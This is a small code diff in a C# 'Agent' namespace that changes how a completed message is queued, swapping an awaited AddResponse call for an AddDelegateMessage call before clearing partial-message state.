@@ -141,7 +141,7 @@ namespace Agent
                                     uuid = linkId,
                                 };
 
-                                await this.messageManager.AddResponse(dm);
+                                this.messageManager.AddDelegateMessage(dm);
                                 this.partialMessages.TryRemove(args.Message.guid, out _);
                                 this.messageSuccess.Set();
                             }
